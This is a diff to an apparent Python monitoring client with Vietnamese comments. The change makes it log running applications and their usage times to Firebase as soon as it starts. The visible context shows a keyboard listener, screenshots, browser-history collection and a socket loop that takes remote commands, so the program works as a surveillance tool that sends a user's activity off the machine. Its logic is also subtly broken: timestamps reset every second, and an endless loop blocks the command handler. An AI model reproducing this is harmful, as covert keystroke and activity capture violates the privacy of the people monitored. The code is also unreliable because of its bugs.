@@ -71,29 +71,46 @@ def takeScreenshot():
 
 def getAppHistory():
     
-    current_apps = set()
+    # Danh sách lưu trữ các ứng dụng hiện tại và thời điểm mở
+    current_apps = {}
+
+    # Lặp vô hạn
     while True:
         # Lấy danh sách các ứng dụng đang chạy
-        running_apps = {process.name() for process in psutil.process_iter() if process.name().endswith('.exe')}
+        running_apps = {process.name(): int(time.time()) for process in psutil.process_iter() if process.name().endswith('.exe')}
         
-        new_apps = running_apps - current_apps
-        closed_apps = current_apps - running_apps
+        # Tìm các ứng dụng mới xuất hiện và tính toán thời gian mở
+        new_apps = {app: timestamp for app, timestamp in running_apps.items() if app not in current_apps}
         
-        for app in new_apps:
-            # print(f"New App: {app}")
-            app_new = "New App: {}".format(app)
-            print(app_new)
-            # clientSocket.send(app_new.encode('utf-8'))
+        # Tìm các ứng dụng bị đóng lại và tính toán thời gian sử dụng
+        for app in current_apps:
+            if app not in running_apps:
+                close_time = int(time.time())
+                start_time = current_apps[app]['start-time']
+                usage_time = close_time - start_time
+                print(f"Closed App: {app}, Usage Time: {usage_time} seconds")
+                
+                # Cập nhật thời gian mở, đóng và thời gian sử dụng vào Firebase
+                current_date = time.strftime('%Y-%m-%d')
+                date_ref = ref.child(current_date)
+                app_ref = date_ref.child('app_history').push()
+                app_ref.update({'app_name': app, 'start-time': start_time, 'end-time': close_time, 'usage-time': usage_time})
         
-        for app in closed_apps:
-            # print(f"Closed App: {app}")
-            app_close = "Closed App: {}".format(app)
-            print(app_close)            
-            # clientSocket.send(app_close.encode('utf-8'))
+        # Cập nhật danh sách các ứng dụng hiện tại và thời điểm mở
+        current_apps = {app: {'start-time': timestamp} for app, timestamp in running_apps.items()}
         
-        current_apps = running_apps
+        # Đẩy dữ liệu vào Firebase với ngày hiện tại
+        current_date = time.strftime('%Y-%m-%d')
+        date_ref = ref.child(current_date)
         
+        # Ghi dữ liệu vào Firebase
+        for app, timestamp in new_apps.items():
+            app_ref = date_ref.child('app_history').push()
+            app_ref.update({'app_name': app, 'start-time': timestamp})
+        
+        # Chờ 1 giây trước khi lặp lại để tránh tải nhiều tài nguyên hệ thống
         time.sleep(1)
+
 def get_edge_history():
     while True:
         
@@ -151,13 +168,14 @@ def get_browsing_history():
            
 with Listener(on_press=on_press) as parent:
     try:
+        getAppHistory()
         while True:
             message = clientSocket.recv(1024).decode('utf-8')
             print("Message:" + message)
             if message == 'takeScreenshot':
                 takeScreenshot()
-            elif message == 'appHistory':
-                getAppHistory()
+            # elif message == 'appHistory':
+                # getAppHistory()
             elif message == 'webHistory':
                 get_edge_history()    
             elif message == 'shutdown':
